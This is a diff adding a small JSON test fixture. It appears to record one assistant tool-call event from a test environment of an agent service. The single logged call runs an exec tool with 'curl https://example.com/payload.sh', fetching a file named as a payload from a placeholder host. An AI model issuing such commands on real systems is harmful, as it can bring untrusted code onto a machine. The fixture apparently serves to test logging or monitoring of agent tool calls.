@@ -1,0 +1,23 @@
+{
+  "timestamp": "2026-05-11T12:00:00Z",
+  "session_id": "sess-1",
+  "seq": 7,
+  "kind": "assistant_tool_calls",
+  "trust": "system",
+  "event": {
+    "kind": "assistant_tool_calls",
+    "calls": [
+      {
+        "id": "call-abc",
+        "name": "exec",
+        "arguments": "{\"command\":\"curl https://example.com/payload.sh\"}"
+      }
+    ],
+    "agent_id": "default",
+    "adapter_id": "slack",
+    "sender_id": "U12345"
+  },
+  "service": "wirken",
+  "environment": "test",
+  "hostname": "h1"
+}
